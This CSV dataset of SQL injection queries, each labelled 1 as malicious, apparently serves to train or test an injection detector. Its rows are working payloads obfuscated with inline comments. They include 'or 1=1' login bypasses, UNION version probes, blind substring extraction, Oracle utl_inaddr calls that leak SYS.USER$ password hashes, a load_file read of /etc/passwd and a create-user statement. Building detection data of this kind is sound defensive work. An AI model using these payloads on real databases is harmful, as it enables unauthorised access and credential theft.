Query,Label
""" o/**/r pg_sleep  (  __TIME__  )  --",1
creat/**/e user name identified b/**/y pass123 tempo/**/rary tab/**/lespace temp default tabl/**/espace users;,1
" A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   SEL/**/ECT DI/**/STI/**/NCT  (  ta/**/ble_name  )   FR/**/OM   (  SELEC/**/T DI/**/STI/**/NCT  (  tabl/**/e_name  )  , ROWNUM AS L/**/IMIT FR/**/OM sys.all_tab/**/les  )   W/**/HERE LIM/**/IT  =  5   )    )    AN/**/D 'i'  =  'i",1
" sel/**/ect * fr/**/om users wh/**/ere id  =  '1' o/**/r @ @1  =  1 u/**/nion s/**/elect 1,version  (    )   -- 1'",1
" sel/**/ect * fr/**/om users wher/**/e id  =  1 o/**/r 1#""  (   unio/**/n se/**/lect 1,version  (    )   -- 1",1
 se/**/lect name fro/**/m syscolumns whe/**/re id   =     (  selec/**/t id fro/**/m sysobjects w/**/here name   =   tabl/**/ename'  )  --,1
sel/**/ect * f/**/rom users wher/**/e id  =  1 +$+ o/**/r 1  =  1 -- 1,1
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115,115,119,100   )    )     )  ,1,1,1;",1
" sele/**/ct * f/**/rom users wh/**/ere id  =  '1' o/**/r ||/1  =  1 un/**/ion sele/**/ct 1,version  (    )   -- 1'",1
" se/**/lect * fro/**/m users w/**/here id  =  '1' o/**/r \.<\ unio/**/n se/**/lect 1,@@VERSION -- 1'",1
? o/**/r 1  =  1 --,1
 )   o/**/r   (  'a'  =  'a,1
admi/**/n' o/**/r 1  =  1#,1
" sel/**/ect * f/**/rom users w/**/here id  =  1 o/**/r ""  (  ]"" o/**/r 1  =  1 -- 1",1
o/**/r 1  =  1 --,1
" A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   SE/**/LECT DI/**/STI/**/NCT  (  column_name  )   F/**/ROM   (  SELE/**/CT DI/**/STI/**/NCT  (  column_name  )  , ROWNUM AS LIMI/**/T FR/**/OM all_tab_columns  )   WH/**/ERE L/**/IMIT  =  5   )    )    AN/**/D 'i'  =  'i",1
" selec/**/t * fr/**/om users wher/**/e id  =  '1' %!<@ un/**/ion se/**/lect 1,version  (    )   -- 1'",1
" se/**/lect * fr/**/om users wh/**/ere id  =  1 o/**/r ""&  (  "" o/**/r 1  =  1 -- 1",1
" se/**/lect * fr/**/om users wh/**/ere id  =  1 o/**/r ""?  (  "" o/**/r 1  =  1 -- 1",1
di/**/sti/**/nct,1
sele/**/ct * fro/**/m users whe/**/re id  =  '1' *  (  \  )   o/**/r 1  =  1 -- 1',1
"1 a/**/nd a/**/scii  (  lower  (  substri/**/ng   (    (   s/**/elect top 1 name fro/**/m sysobjects whe/**/re xtype  =  'u'  )  , 1, 1   )    )     )   > 116",1
se/**/lect * fr/**/om users wher/**/e id  =  1 o/**/r \.<\ o/**/r 1  =  1 -- 1,1
"admi/**/n"" o/**/r ""1""  =  ""1""--",1
" s/**/elect * fr/**/om users wher/**/e id  =  1 o/**/r ""%{"" o/**/r 1  =  1 -- 1",1
i/**/nsert,1
" sel/**/ect * f/**/rom users wher/**/e id  =  1 o/**/r 1#""?  =  1 o/**/r 1  =  1 -- 1",1
" sele/**/ct * fro/**/m users w/**/here id  =  1 o/**/r ""%?"" o/**/r 1  =  1 -- 1",1
" A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   SE/**/LECT DI/**/STI/**/NCT  (  PASSWO/**/RD  )   F/**/ROM   (  SELEC/**/T DI/**/STI/**/NCT  (  PASSWO/**/RD  )  , ROWNUM AS LI/**/MIT FRO/**/M SYS.USER$  )   WH/**/ERE LI/**/MIT  =  8   )    )    AN/**/D 'i'  =  'i",1
" selec/**/t * f/**/rom users w/**/here id  =  1 o/**/r ""?#"" o/**/r 1  =  1 -- 1",1
